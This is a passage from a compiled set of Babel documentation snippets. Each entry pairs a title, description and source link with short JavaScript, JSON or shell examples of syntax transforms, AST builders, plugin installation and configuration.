use of template strings (template literals) for string construction in ES2015. It covers basic literal string creation, multiline strings, variable interpolation using `${}`, and unescaped template strings using `String.raw`.  It also provides an example of using a tag to customize string construction.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Basic literal string creation\n`This is a pretty little template string.`\n\n// Multiline strings\n`In ES5 this is\n not legal.`\n\n// Interpolate variable bindings\nvar name = \"Bob\", time = \"today\";\n`Hello ${name}, how are you ${time}?`\n\n// Unescaped template strings\nString.raw`In ES5 \"\\n\" is a line-feed.`\n\n// Construct an HTTP request prefix is used to interpret the replacements and construction\nGET`http://foo.org/bar?a=${a}&b=${b}\n    Content-Type: application/json\n    X-Credentials: ${credentials}\n    { \"foo\": ${foo},\n      \"bar\": ${bar}}`(myOnReadyStateChangeHandler);\n```\n\n----------------------------------------\n\nTITLE: Implementing Named Capturing Groups in JavaScript Regex\nDESCRIPTION: This code snippet demonstrates the implementation of named capturing groups in JavaScript regular expressions using the `(?<name>...)` syntax. It showcases how to define a named group within a regular expression and how to extract the captured value using the `groups` property of the match object. The `@babel/plugin-transform-named-capturing-groups-regex` package or `@preset-env` needs to be installed.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-01-21-7.3.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet stringRe = /(?<quote>\"|')(?<contents>.*?)\\k<quote>/;\n\nlet { contents } = `\"foo bar\"`.match(stringRe);\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Text in JavaScript\nDESCRIPTION: This snippet creates a `JSXText` AST node using Babel's `t.jsxText` builder. The `value` parameter is a string representing the text content.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_107\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxText(value);\n```\n\n----------------------------------------\n\nTITLE: Transform RegExp 'i' Modifier in Babel\nDESCRIPTION: Transforms a regular expression with the 'i' modifier to be case-insensitive. It converts the inline (?i:a) to a character class [Aa].\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-modifiers.md#_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n// matches Aa and aa\nconst regex = /(?i:a)a/\n```\n\nLANGUAGE: js\nCODE:\n```\nconst regex = /(?:[Aa])a/\n```\n\n----------------------------------------\n\nTITLE: JSX Fragment Compilation Output\nDESCRIPTION: This JavaScript code shows the compiled output of the JSX fragment example, using `React.createElement` and `React.Fragment`. It demonstrates how JSX fragments are transformed into standard React elements.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\nrender() {\n  return React.createElement(\n    React.Fragment,\n    null,\n    React.createElement(ChildA, null),\n    React.createElement(ChildB, null)\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Plugin Usage via CLI Shell\nDESCRIPTION: This command demonstrates how to use the @babel/plugin-transform-async-to-generator plugin via the Babel CLI to transform a JavaScript file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-to-generator.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-async-to-generator script.js\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm\nDESCRIPTION: Command to install the @babel/plugin-transform-optional-catch-binding plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-catch-binding.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-optional-catch-binding\n```\n\n----------------------------------------\n\nTITLE: Instance Private Accessors in Babel\nDESCRIPTION: This snippet shows support for instance private accessors, which are class methods only accessible within the class instance. They are denoted by the `#` prefix.  Babel transforms this syntax to ensure privacy.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Dog {\n  get #randomId() { return Math.random(); }\n}\n```\n\n----------------------------------------\n\nTITLE: Babel CLI Usage\nDESCRIPTION: This shell command demonstrates how to use the Babel CLI to transform a JavaScript file (`script.js`) using the `@babel/plugin-transform-private-methods` plugin. This is useful for ad-hoc transformations.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-methods.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\n$ babel --plugins @babel/plugin-transform-private-methods script.js\n```\n\n----------------------------------------\n\nTITLE: Using @babel/helpers Directly\nDESCRIPTION: This snippet demonstrates how to import and use a helper directly from the @babel/helpers package. It imports both the helpers object and the @babel/types package, retrieves the 'typeof' helper, and checks if it's an expression statement.\nSOURCE: https://github.com/babel/website/blob/main/docs/helpers.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport * as helpers from \"@babel/helpers\";\nimport * as t from \"@babel/types\";\n\nconst typeofHelper = helpers.get(\"typeof\");\n\nt.isExpressionStatement(typeofHelper);\n// true\n```\n\n----------------------------------------\n\nTITLE: Example ES2015 code after Babili minification\nDESCRIPTION: This code example demonstrates the output after minification using Babili. The class name and variable names have been shortened to `a` and `b` respectively. Whitespace has been removed, resulting in more compact code.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-12-07-the-state-of-babel.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\n// ES2015 code -> Babili -> Minified ES2015 Code\nclass a{constructor(b){this.program=b}}new a;\n```\n\n----------------------------------------\n\nTITLE: Creating Meta Property in JavaScript\nDESCRIPTION: This snippet creates a `MetaProperty` AST node using Babel's `t.metaProperty` builder. The `meta` and `property` parameters are both `Identifier` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_111\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.metaProperty(meta, property);\n```\n\n----------------------------------------\n\nTITLE: Creating EnumNumberBody in JavaScript\nDESCRIPTION: This snippet demonstrates creating an `EnumNumberBody` AST node using Babel's `t.enumNumberBody` method. The `members` parameter is a required array of `EnumNumberMember` nodes, while `explicitType` and `hasUnknownMembers` are required boolean values. This represents the body of an enum containing number-valued members.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_55\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.enumNumberBody(members);\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: Uses the Babel CLI to transform a script using the transform-regexp-modifiers plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-modifiers.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/@babel/plugin-transform-regexp-modifiers script.js\n```\n\n----------------------------------------\n\nTITLE: Creating an OpaqueType in JavaScript\nDESCRIPTION: This code snippet demonstrates creating an `OpaqueType` AST node using `t.opaqueType(id, typeParameters, supertype, impltype)`. It represents an opaque type declaration in Flow. Parameters include the ID, type parameters, supertype, and implementation type.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_132\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.opaqueType(id, typeParameters, supertype, impltype);\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin (npm)\nDESCRIPTION: This command installs the @babel/plugin-transform-template-literals plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-template-literals.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-template-literals\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Optional Type\nDESCRIPTION: Creates a TypeScript optional type node in the AST. Represents an optional type, indicated by a question mark (`?`) after a property name in an object type or interface. Requires the type annotation to be made optional.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_198\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsOptionalType(typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Context Access in Decorators (JavaScript)\nDESCRIPTION: This code snippet highlights the updated semantics for `context.access` methods within decorators. The target object is now expected as the first parameter to these methods, rather than as the `this` receiver, to ensure correct behavior in decorator execution and access to class properties.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-02-20-7.21.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet accessX;\n\nfunction dec(desc, context) {\n  accessX = context.access;\n  return dec;\n}\n\nclass A {\n  @dec #x = 1;\n}\n\n// old semantics\naccessX.get.call(new A) === 1;\n\n// new semantics\naccessX.get(new A) === 1;\n```\n\n----------------------------------------\n\nTITLE: Creating a String Type Annotation Node in Babel\nDESCRIPTION: Creates a `StringTypeAnnotation` AST node using the Babel types module.  This represents a string type annotation in Flow.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_153\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.stringTypeAnnotation();\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with Targets (Old)\nDESCRIPTION: Example of an older Babel configuration using the `targets` option within the `@babel/preset-env` preset and the `polyfill-es-shims` plugin.  It shows how targets were previously defined in multiple places. The target specifies browser versions to support.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-02-22-7.13.0.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\n    [\"@babel/preset-env\", {\n        \"targets\": \">1%, not ie 11\"\n    }]\n  ],\n  \"plugins\": [\n    [\"polyfill-es-shims\", {\n      \"targets\": \">1%, not ie 11\"\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Transpiling JavaScript File with Babel in C#\nDESCRIPTION: This code snippet shows how to transpile an entire JavaScript file using the Babel transformer in C#. The `TransformFile` method is called with the file path as the argument. The result of the transformation is stored in the `result` variable.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/dotnet/usage.md#_snippet_1\n\nLANGUAGE: C#\nCODE:\n```\n// Transpiles a file\n// You can instead use `TransformFileWithSourceMap` if you want a source map too.\nvar result = babel.TransformFile(\"foo.js\");\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: This JSON configuration enables the @babel/plugin-syntax-import-reflection plugin in a Babel project. Adding the plugin to the plugins array allows Babel to parse the import reflection syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-reflection.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-import-reflection\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/core with npm\nDESCRIPTION: This command installs the @babel/core package as a development dependency using npm. The --save-dev flag ensures that the package is added to the `devDependencies` section of the `package.json` file. This indicates that the package is only needed during development and not at runtime.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/node/install.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/core\n```\n\n----------------------------------------\n\nTITLE: Detect Usage in Hoisted Scope JavaScript\nDESCRIPTION: Shows how babel-helper-evaluate-path handles variable hoisting with 'var' declarations. The example demonstrates a scenario where a variable is conditionally initialized, leading to uncertainty about its value outside the conditional block. The analysis is not fully deterministic in this case.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-evaluate-path.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction foo() {\n  if (a) var x = 5;\n  console.log(x); // cannot determine\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel with Preset Stage 2 (JSON)\nDESCRIPTION: Example of configuring Babel to use the `@babel/preset-stage-2` preset within a `babel.config.json` file.  Note that stage presets are deprecated.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-2.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-stage-2\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Function with Optional Parameters (JavaScript)\nDESCRIPTION: This JavaScript code defines a function with optional parameters. The `ignoreFunctionLength` assumption tells Babel that the compiled code does not rely on the `.length` property of the function, which reflects the number of parameters up to the last non-default parameter.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction fn(a, b = 2, c, d = 3) {\n  return a + b + c + d;\n}\n```\n\n----------------------------------------\n\nTITLE: Installing the Pipeline Operator Plugin\nDESCRIPTION: This command installs the @babel/plugin-proposal-pipeline-operator as a development dependency using npm. This is the first step to using the pipeline operator in your Babel project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-pipeline-operator.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-pipeline-operator\n```\n\n----------------------------------------\n\nTITLE: Optional Chaining with Private Fields JavaScript\nDESCRIPTION: This snippet shows how optional chaining (`?.`) can now be used with private fields. It highlights that if the object is not nullish but does not have the private field, an error will still be thrown, similar to directly accessing a non-existent private field.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-05-25-7.10.0.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nobj?.property.#priv;\nobj?.#priv;\n```\n\n----------------------------------------\n\nTITLE: Creating an ObjectPattern in JavaScript\nDESCRIPTION: This code snippet shows how to create an `ObjectPattern` AST node using `t.objectPattern(properties)`. The `properties` parameter is an array of `RestElement` or `ObjectProperty` nodes, defining the properties to extract from the object during destructuring. This node represents object destructuring patterns.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_124\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.objectPattern(properties);\n```\n\n----------------------------------------\n\nTITLE: Plugin Usage via Node API\nDESCRIPTION: Example of using the plugin programmatically via the Node API. This shows how to transform code using `transformSync` with the plugin enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-arrow-functions.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-arrow-functions\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Use plugin via Node API\nDESCRIPTION: This JavaScript code snippet shows how to use the @babel/plugin-transform-shorthand-properties plugin programmatically via the Babel Node API. It takes code as a string and applies the plugin to it.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-shorthand-properties.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-shorthand-properties\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Block Scoping Transformation JavaScript\nDESCRIPTION: Demonstrates the transformation of let variables within a block scope to var variables by the @babel/plugin-transform-block-scoping plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-block-scoping.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n{let a = 3;}\n\nlet a = 3;\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n{var _a = 3;}\n\nvar a = 3;\n```\n\n----------------------------------------\n\nTITLE: Installing the Plugin (Shell)\nDESCRIPTION: This command shows how to install the @babel/plugin-transform-unicode-sets-regex plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-sets-regex.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-unicode-sets-regex\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin - JSON\nDESCRIPTION: This JSON configuration enables the @babel/plugin-transform-typeof-symbol plugin. It adds the plugin to the `plugins` array in the `babel.config.json` file, which Babel uses to configure transformations.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typeof-symbol.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-typeof-symbol\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using Babel Preset ES2016 via CLI\nDESCRIPTION: Executes the Babel CLI to transpile a script.js file using the @babel/preset-es2016 preset. The --presets flag specifies which presets to use during the transpilation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-es2016.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel script.js --presets @babel/preset-es2016\n```\n\n----------------------------------------\n\nTITLE: SystemJS Dynamic Import (JavaScript)\nDESCRIPTION: Shows how to use the `import()` syntax for dynamic imports in the context of the `transform-es2015-modules-systemjs` plugin. The code demonstrates a function that lazily loads a module and then calls a function from it.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_18\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport function lazyLoadOperation () {\n  return import('./x')\n  .then(function (x) {\n    x.y();\n  });\n}\n```\n\n----------------------------------------\n\nTITLE: TypeScript Assertion Function and Class Field Declaration\nDESCRIPTION: This code demonstrates the usage of TypeScript assertion functions and the `declare` keyword in class fields, features supported in Babel 7.7.0. The `assertString` function asserts that the input `x` is a string. The `Developer` class extends `Person` and declares a `usingBabel` property using the `declare` keyword, indicating that the property will be defined elsewhere.  Requires TypeScript and appropriate Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-11-05-7.7.0.md#_snippet_4\n\nLANGUAGE: typescript\nCODE:\n```\nfunction assertString(x): assert x is string {\n  if (typeof x !== \"string\") throw new Error(\"It must be a string!\");\n}\n\nclass Developer extends Person {\n  declare usingBabel: boolean;\n}\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Satisfies Expression\nDESCRIPTION: Creates a TypeScript satisfies expression node in the AST. Represents the `satisfies` operator, used to check if an expression conforms to a given type without widening the expression's type. Requires the expression and the type annotation.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_204\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsSatisfiesExpression(expression, typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Installing the Plugin (Shell)\nDESCRIPTION: Installs the @babel/plugin-transform-private-property-in-object plugin using npm.  This command adds the plugin as a development dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-property-in-object.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-private-property-in-object\n```\n\n----------------------------------------\n\nTITLE: RestProperty & SpreadProperty Removal\nDESCRIPTION: This code snippet shows how to update plugin code after the removal of `RestProperty` and `SpreadProperty` nodes.  `RestElement` and `SpreadElement` should be used instead, and context checked via `path.parentPath` to determine if they appear inside objects or arrays.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_17\n\nLANGUAGE: diff\nCODE:\n```\n return {\n   SpreadElement(path) {\n-    ...\n-  },\n-  SpreadProperty(path) {\n-    ...\n+    if (path.parentPath.isObjectExpression()) {\n+      ...\n+    } else if (path.parentPath.isArrayExpression()) {\n+      ...\n+    }\n   },\n   RestElement(path) {\n-    ...\n-  },\n-  RestProperty(path) {\n-    ...\n+    if (path.parentPath.isObjectPattern()) {\n+      ...\n+    } else if (path.parentPath.isArrayPattern()) {\n+      ...\n+    }\n   }\n };\n```\n\n----------------------------------------\n\nTITLE: Installing babel-plugin-transform-remove-console\nDESCRIPTION: Instructions on how to install the babel-plugin-transform-remove-console using npm. This command installs the plugin as a development dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-console.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-transform-remove-console --save-dev\n```\n\n----------------------------------------\n\nTITLE: Strict example\nDESCRIPTION: Example of `strict` option\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-commonjs.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar foo = (exports.foo = 5);\n\nObject.defineProperty(exports, \"__esModule\", {\n  value: true,\n});\n```\n\n----------------------------------------\n\nTITLE: Transform Class Properties - Input (JavaScript)\nDESCRIPTION: This snippet shows the input JavaScript code for class properties transformation. It defines a class `Foo` with a static property `bar` and an instance property `baz`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  static bar;\n  baz = 'guy';\n}\n```\n\n----------------------------------------\n\nTITLE: TypeOf Symbol.prototype JavaScript\nDESCRIPTION: Demonstrates that `typeof Symbol.prototype` should be 'object' in JavaScript.  This code snippet illustrates the expected behavior of the `typeof` operator when applied to `Symbol.prototype`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\n// `typeof Symbol.prototype` should be 'object'\ntypeof Symbol.prototype === 'object'\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Namespaced Name in JavaScript\nDESCRIPTION: This snippet creates a `JSXNamespacedName` AST node using Babel's `t.jsxNamespacedName` builder. The `namespace` and `name` parameters are both `JSXIdentifier` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_102\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxNamespacedName(namespace, name);\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: Example of using the Babel Node API to transform code with the @babel/plugin-transform-optional-catch-binding plugin. Requires @babel/core.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-catch-binding.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-optional-catch-binding\"],\n});\n```\n\n----------------------------------------\n\nTITLE: JavaScript Example: Input Code\nDESCRIPTION: This example shows the input JavaScript code before the transformation. It uses the strict equality operator (===) to compare the type of 'foo' with the string 'object'.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-simplify-comparison-operators.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\ntypeof foo === \"object\";\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Empty Expression in JavaScript\nDESCRIPTION: This snippet creates a `JSXEmptyExpression` AST node using Babel's `t.jsxEmptyExpression` builder. It requires no parameters.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_97\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxEmptyExpression();\n```\n\n----------------------------------------\n\nTITLE: Installing gulp-babel-minify using npm\nDESCRIPTION: This command installs gulp-babel-minify as a development dependency using npm. This allows you to use it in your Gulp build process to minify your JavaScript files.\nSOURCE: https://github.com/babel/website/blob/main/docs/gulp-babel-minify.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install gulp-babel-minify --save-dev\n```\n\n----------------------------------------\n\nTITLE: ExportNamedDeclaration with TSImportEqualsDeclaration AST (Babel 8)\nDESCRIPTION: This is the AST representation of the same statement in Babel 8, where the TSImportEqualsDeclaration is nested within an ExportNamedDeclaration. The `isExport` field is no longer present.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_10\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"ExportNamedDeclaration\",\n  \"declaration\": {\n    \"type\": \"TSImportEqualsDeclaration\",\n    \"importKind\": \"value\",\n    \"id\": Identifier(\"foo\"),\n    \"moduleReference\": {\n      \"type\": \"TSExternalModuleReference\",\n      \"expression\": StringLiteral(\"foo\")\n    }\n  },\n  \"specifiers\": []\n}\n```\n\n----------------------------------------\n\nTITLE: JSON Module Transform (uncheckedRequire: false)\nDESCRIPTION: This snippet demonstrates the transformed code when targeting CommonJS, with the `uncheckedRequire` option set to `false` (default). It uses `require` to read the file and `JSON.parse` to parse its contents, with extra checks.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-modules.md#_snippet_9\n\nLANGUAGE: js\nCODE:\n```\nconst data = JSON.parse(require(\"fs\").readFileSync(require.resolve(\"./data.json\")));\n```\n\n----------------------------------------\n\nTITLE: Detecting Variable Usage Errors JavaScript\nDESCRIPTION: Demonstrates how babel-helper-evaluate-path detects ReferenceError for let variables accessed before declaration and void 0 for var variables. The function `foo` illustrates the ReferenceError, while `bar` shows the 'void 0' and later reassignment of a var variable.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-evaluate-path.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction foo() {\n  console.log(b); // ReferenceError\n  let b = 1;\n}\n\nfunction bar() {\n  console.log(a); // a is void 0\n  var a = 5;\n  console.log(a); // 5\n}\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via NPM\nDESCRIPTION: Command to install the `@babel/plugin-transform-react-inline-elements` plugin as a development dependency using npm.  It's crucial to install this plugin as a dev dependency, as it's intended for build-time optimization, not runtime code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-inline-elements.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-react-inline-elements\n```\n\n----------------------------------------\n\nTITLE: Installing Babel CLI and Core with npm\nDESCRIPTION: Installs Babel's command-line interface (CLI) globally and Babel's core library as a development dependency using npm. `babel-cli` allows running Babel from the command line, while `babel-core` provides the Node API for programmatic usage.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-31-setting-up-babel-6.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ npm install --global babel-cli\n# or\n$ npm install --save-dev babel-core\n```\n\n----------------------------------------\n\nTITLE: Transformed Class Static Block JavaScript\nDESCRIPTION: Shows the output of the babel transformation for class static blocks. It transforms the static block into an immediately invoked arrow function expression that initializes a static private property.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-static-block.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass C {\n  static #x = 42;\n  static y;\n  static #_ = (() => {\n    try {\n      this.y = doSomethingWith(this.#x);\n    } catch {\n      this.y = \"unknown\";\n    }\n  })();\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a BooleanTypeAnnotation Node\nDESCRIPTION: Creates an AST node representing a boolean type annotation.  There are no parameters. Use `t.isBooleanTypeAnnotation(node, opts)` to check if a node is a BooleanTypeAnnotation and `t.assertBooleanTypeAnnotation(node, opts)` to assert that a node is a BooleanTypeAnnotation.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_16\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.booleanTypeAnnotation();\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: Configures the Babel plugin in the babel.config.json file to enable the transform-regexp-modifiers plugin.  This is the recommended way to use the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-modifiers.md#_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-regexp-modifiers\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Static Private Methods in Babel\nDESCRIPTION: This snippet demonstrates static private methods using the `#` prefix. These methods are only accessible within the class they are defined in. Babel must be configured to transpile the private method syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Dog {\n  static #register() { /* ... */ }\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Node API Usage\nDESCRIPTION: This example demonstrates how to use the @babel/plugin-syntax-module-string-names plugin with the Babel Node API. It transforms the provided code string using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-module-string-names.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-module-string-names\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Installation via npm Shell\nDESCRIPTION: Installs the `@babel/plugin-transform-class-static-block` plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-static-block.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-class-static-block\n```\n\n----------------------------------------\n\nTITLE: new.target with Untransformed Classes Caveat - JavaScript\nDESCRIPTION: Highlights a potential issue when using `new.target` with untransformed classes. If classes aren't transformed to ES5 and `super()` hasn't been called, accessing `new.target` will result in an error. This example is not functional as is, it shows a use case when the result can be incorrect if the target environment does not support `new.target` and `super()`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-new-target.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {}\n\nclass Bar extends Foo {\n  constructor() {\n    // This will be a problem if classes aren't transformed to ES5\n    new.target;\n    super();\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Let and Const Declarations in JavaScript\nDESCRIPTION: Explains the `let` and `const` keywords introduced in ES2015 for block-scoped variable declarations. `let` is similar to `var` but with block scope, while `const` declares a read-only constant. The example highlights the differences in scope and mutability between `let`, `const`, and `var`.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction f() {\n  {\n    let x;\n    {\n      // this is ok since it's a block scoped name\n      const x = \"sneaky\";\n      // error, was just defined with `const` above\n      x = \"foo\";\n    }\n    // this is ok since it was declared with `let`\n    x = \"bar\";\n    // error, already declared above in this block\n    let x = \"inner\";\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a TupleTypeAnnotation with Babel\nDESCRIPTION: Creates a `TupleTypeAnnotation` AST node using the `t.tupleTypeAnnotation` method. This node represents a tuple type annotation in Flow, where `types` is an array of `FlowType` nodes defining the types of the tuple elements.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_234\n\nLANGUAGE: 